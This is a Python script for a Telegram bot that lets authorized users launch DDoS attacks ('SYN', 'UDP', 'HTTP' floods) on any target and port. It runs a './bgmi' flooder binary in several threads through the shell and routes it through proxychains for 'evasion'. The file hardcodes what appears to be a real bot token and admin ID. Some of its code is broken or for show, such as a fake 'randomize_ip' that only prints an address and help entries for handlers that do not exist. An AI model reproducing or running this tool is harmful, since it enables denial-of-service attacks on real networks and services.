#!/usr/bin/python3
# By Indian Watchdogs @Indian_Hackers_Team
import os, telebot
from keep_alive import keep_alive
import telebot
import subprocess
import requests
import datetime
import os
import threading  # Import threading for concurrent attacks
import random  # Import random for evasion

# insert your Telegram bot token here
bot = telebot.TeleBot('7475371008:AAEs58N6XRK2ys_EXy47ZOa2kuq7tkPdukg')

# Admin user IDs
admin_id = ["7164885902"]

# File to store allowed user IDs
USER_FILE = "users.txt"

# File to store command logs
LOG_FILE = "log.txt"

# List to store allowed user IDs
allowed_user_ids = []

# Function to read user IDs from the file
def read_users():
    try:
        with open(USER_FILE, "r") as file:
            return file.read().splitlines()
    except FileNotFoundError:
        return []

# Load allowed user IDs at startup
allowed_user_ids = read_users()

# Function to log command to the file
def log_command(user_id, target, port, time, method):
    user_info = bot.get_chat(user_id)
    username = "@" + user_info.username if user_info.username else f"UserID: {user_id}"
    
    with open(LOG_FILE, "a") as file:  # Open in "append" mode
        file.write(f"Username: {username}\nTarget: {target}\nPort: {port}\nTime: {time}\nMethod: {method}\n\n")

# Function to execute attack commands
def execute_attack(command):
    subprocess.run(command, shell=True)

# Function to start multiple attacks
def start_attack(target, port, time, method):
    attack_command = f"./bgmi {target} {port} {time} 500"
    threads = []
    for _ in range(5):  # Adjust the number of threads as needed
        thread = threading.Thread(target=execute_attack, args=(attack_command,))
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

# Evasion techniques
def randomize_ip():
    return f"{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}"

def use_proxy_chains(command):
    # Example of how to route command through proxychains
    return f"proxychains {command}"

# Handler for /bgmi command with dynamic payload selection
@bot.message_handler(commands=['bgmi'])
def handle_bgmi(message):
    user_id = str(message.chat.id)
    if user_id in allowed_user_ids:
        command = message.text.split()
        if len(command) == 4:
            target = command[1]
            port = int(command[2])
            time = int(command[3])
            
            # Add method selection logic (e.g., SYN flood, UDP flood)
            methods = ['SYN', 'UDP', 'HTTP']  # Different attack methods
            method = random.choice(methods)
            
            if time > 5000:
                response = "Error: Time interval must be less than 5000."
            else:
                log_command(user_id, target, port, time, method)
                start_attack(target, port, time, method)
                response = f"{method} Attack Started on Target: {target} Port: {port} for {time} seconds."
                
                # Randomize IP to evade detection
                randomized_ip = randomize_ip()
                print(f"Attack launched from IP: {randomized_ip}")

                # Route attack through proxychains for added anonymity
                attack_command = use_proxy_chains(f"./bgmi {target} {port} {time} 500")
                execute_attack(attack_command)
                
                response += f"\nAttack Command: {attack_command}\nAttack launched from IP: {randomized_ip}"
        else:
            response = "Usage: /bgmi <target> <port> <time>"
    else:
        response = "You Are Not Authorized To Use This Command."
    
    bot.reply_to(message, response)

@bot.message_handler(commands=['help'])
def show_help(message):
    help_text = '''
Available commands:
 /bgmi : Launch a DDoS attack. Usage: /bgmi <target> <port> <time>
 /logs : Retrieve logs of executed commands.
 /add <userId> : Add a new user to authorized list (Admin only).
 /remove <userId> : Remove a user from authorized list (Admin only).
 /clearlogs : Clear the command logs (Admin only).
 /admincmd : List of admin commands.
By Indian Watchdogs @Indian_Hackers_Team
'''
    bot.reply_to(message, help_text)

@bot.message_handler(commands=['start'])
def welcome_start(message):
    user_name = message.from_user.first_name
    response = f"Welcome, {user_name}! Type /help to see available commands."
    bot.reply_to(message, response)

@bot.message_handler(commands=['logs'])
def show_recent_logs(message):
    user_id = str(message.chat.id)
    if user_id in admin_id:
        if os.path.exists(LOG_FILE) and os.stat(LOG_FILE).st_size > 0:
            try:
                with open(LOG_FILE, "rb") as file:
                    bot.send_document(message.chat.id, file)
            except FileNotFoundError:
                response = "No data found."
                bot.reply_to(message, response)
        else:
            response = "No data found."
            bot.reply_to(message, response)
    else:
        response = "Only Admin Can Run This Command."
        bot.reply_to(message, response)

bot.polling()